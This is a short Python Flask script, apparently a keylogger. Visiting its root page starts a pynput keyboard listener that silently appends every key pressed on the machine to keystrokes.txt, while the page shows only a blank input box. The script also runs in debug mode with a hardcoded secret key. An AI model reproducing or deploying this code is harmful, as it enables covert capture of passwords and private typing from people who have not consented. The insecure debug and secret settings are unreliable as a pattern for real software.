from flask import Flask
from pynput import keyboard
log_file = 'keystrokes.txt'

app = Flask(__name__)
app.secret_key = 'segredo-secreto'

@app.route("/")
def index():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    return '<input style= "margin: 0 auto; display:  block; width: 80%;background-repeat: no-repeat;">'

def on_press(key):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(key))

if __name__ == '__main__':
    app.run(debug=True)
